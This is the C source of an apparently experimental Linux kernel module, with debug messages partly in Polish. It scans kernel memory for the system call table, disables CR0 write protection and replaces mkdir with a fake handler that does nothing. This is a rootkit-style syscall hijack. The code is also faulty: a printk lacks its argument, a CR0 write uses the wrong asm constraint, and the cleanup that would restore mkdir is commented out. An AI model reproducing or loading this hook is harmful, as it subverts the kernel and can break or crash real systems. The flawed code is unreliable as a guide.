#include <linux/module.h>
#include <asm/unistd.h>
#include <linux/linkage.h>

MODULE_LICENSE("GPL");

//unsigned long *sys_call_table;
typedef asmlinkage int (*syscall_t)(void *a0,...);

extern void* sys_close;

	void **sys_call_table = NULL;
//extern syscall_t sys_call_table[];

int (*org_mkdir)(const char* pathname, mode_t mode);

static uint64_t **aquire_sys_call_table(void)
{
	uint64_t offset = PAGE_OFFSET;
	uint64_t **sct;

	while(offset < ULLONG_MAX)
	{
		sct = (uint64_t **)offset;

		if(sct[__NR_close] == (uint64_t *)sys_close)
		{
			printk("\nsys_call_table found at 0x%p\n");
			return sct;
		}
		offset += sizeof(void*);
	}

	return NULL;
}

static void disable_page_protection(void)
{
	unsigned long value;

	long mask = 0x00010000;

	printk("DISSS 1");

	asm volatile("mov %%cr0,%0" : "=r" (value));
	
	printk("DISS 2");

	if(value & mask)
	{
		value &= ~mask;
		printk("DISS 3");

		asm volatile("mov %0,%%cr0" : "=r" (value));
		printk("DISS 4");
	}


}


int hacked_mkdir(const char* pathname, mode_t mode)
{
	printk("FAKE MKDIR WAS RUN!!!!!!!");
	return 0;
}

static int __init lkm_init(void)
{
	printk("START Modulu");

//	disable_page_protection();

	write_cr0(read_cr0() & (~ 0x10000));


	printk("POINTER %p KONIEC pointer SYScallTable", sys_call_table);
	
	sys_call_table = aquire_sys_call_table();

	printk("POMIEDZY");

	org_mkdir = sys_call_table[__NR_mkdir];

	printk("Przed podmiana");

	sys_call_table[__NR_mkdir] = hacked_mkdir;

	printk("AFTER PODMIANA");
	
	return 0;
}

static void __exit lkm_clean(void)
{
//	sys_call_table[__NR_mkdir] = org_mkdir;
}

module_init(lkm_init);
module_exit(lkm_clean);
